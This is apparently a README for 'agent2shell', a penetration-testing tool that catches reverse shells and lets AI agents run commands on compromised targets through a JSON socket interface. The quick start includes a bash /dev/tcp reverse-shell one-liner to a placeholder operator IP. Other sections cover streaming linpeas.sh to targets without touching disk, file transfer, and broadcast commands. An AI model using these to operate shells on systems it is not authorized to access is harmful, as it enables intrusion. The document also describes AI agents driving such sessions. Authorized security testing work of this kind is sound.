# agent2shell

Programmable reverse shell interface for AI agents and automation.

agent2shell catches reverse shell connections over TCP and exposes them as structured JSON APIs via Unix domain sockets. AI agents, scripts, and automation tools can execute commands, transfer files, and query session metadata — all with clean output, exit codes, and timeouts.

## Why

After gaining RCE on a target, penetration testers land in a raw reverse shell in a separate terminal. AI agents cannot interact with it:

- No programmatic API — the shell lives in another terminal process
- No command boundaries — you can't tell where one command's output ends
- No exit codes, no structured output
- Terminal escape codes and prompt strings pollute output

agent2shell solves this by turning a raw reverse shell into a structured, programmable interface.

## Architecture

```
  Operator Terminal                          Target System
 ┌──────────────────────┐                  ┌──────────────┐
 │                      │    TCP (4444)     │              │
 │  agent2shell catch   │◄─────────────────│  bash -i >&  │
 │                      │                  │  /dev/tcp/…  │
 │  ┌────────────────┐  │                  └──────────────┘
 │  │  Unix Socket   │  │
 │  │  /tmp/a2s-*.sock│  │
 │  └───────┬────────┘  │
 │          │           │
 └──────────┼───────────┘
            │
    ┌───────┴────────┐
    │  AI Agent /    │
    │  Script / CLI  │
    │                │
    │  agent2shell   │
    │  run --json    │
    └────────────────┘
```

The operator runs `agent2shell catch` to listen for a reverse shell. On connection, a Unix domain socket is created. Any process on the operator machine — an AI agent, a script, another terminal — can send commands through that socket and receive structured JSON responses.

## Quick Start

```bash
# Terminal 1: Catch a reverse shell
agent2shell catch -p 4444

# Target sends reverse shell
bash -i >& /dev/tcp/OPERATOR_IP/4444 0>&1

# Terminal 2: AI agent or script sends commands
agent2shell run "whoami"
# www-data

agent2shell run --json "id"
# {"output":"uid=33(www-data) gid=33(www-data) groups=33(www-data)\n","exit_code":0,"duration_ms":12}

agent2shell status --json
# {"remote_addr":"10.10.14.5:43210","shell":"bash","user":"www-data","hostname":"target-web-01",...}
```

## Features

### Double-Marker Command Boundaries

Commands are wrapped with start and end markers for reliable output parsing:

```bash
echo '---A2S-START-a1b2c3d4---'; whoami; echo '---A2S-END-a1b2c3d4---'$?
```

This eliminates false positives from single-marker systems and enables failure classification — distinguishing "never started" from "started but hung" from "completed with error."

### Commands

| Command | Description |
|---------|-------------|
| `catch` | TCP listener — catches reverse shell, creates Unix socket |
| `run` | Execute a command, get structured output + exit code |
| `status` | Session metadata (user, hostname, OS, shell, distro) |
| `list` | List all active sessions |
| `push` | Upload file to target (base64, chunked, checksum verified) |
| `pull` | Download file from target |
| `broadcast` | Execute command across multiple sessions |

### Session Recording

Full session transcripts in JSONL format with timestamps for every command and output. Useful for reporting, evidence collection, and post-engagement review.

```json
{"ts":"2026-03-30T14:22:05.000Z","type":"exec","source":"agent","command":"id"}
{"ts":"2026-03-30T14:22:05.012Z","type":"result","output":"uid=33(www-data)...\n","exit_code":0,"duration_ms":12}
```

### Target Auto-Detection

On connection, agent2shell probes the target for:
- Shell type (sh, bash, zsh, ash, dash)
- OS and architecture
- Linux distribution
- Available package manager (apt, yum, dnf, apk, pacman)
- Service manager (systemctl, service, rc-service)

### Script Streaming

Run local scripts on the target without uploading files. agent2shell pipes script content through the shell's stdin — the script executes on the target but never touches disk.

```bash
agent2shell run --stdin ./linpeas.sh
```

### SSH Tunnel Support

Unix sockets work seamlessly with SSH forwarding:

```bash
ssh -L /tmp/a2s-remote.sock:/tmp/a2s-1.sock user@operator-box
agent2shell run -s /tmp/a2s-remote.sock "whoami"
```

## Design Decisions

- **No embedded AI agent.** agent2shell is a clean interface. Any AI agent can use it. Embedding one would lock users into a specific provider.
- **No encrypted transport.** Operators already have SSH tunnels, VPNs, and their own transport security.
- **No C2 framework.** This is a shell interface, not command-and-control. It catches shells and makes them programmable. Period.
- **Unix sockets for IPC.** Fast, no HTTP overhead, works with SSH tunneling, standard Unix tooling.

## Building

```bash
make build    # Build for current platform
make release  # Cross-compile all targets
make test     # Unit tests
make test-e2e # End-to-end tests
```

Requires Go 1.22+. Produces a single static binary (CGO_ENABLED=0).

## License

[MIT](LICENSE)
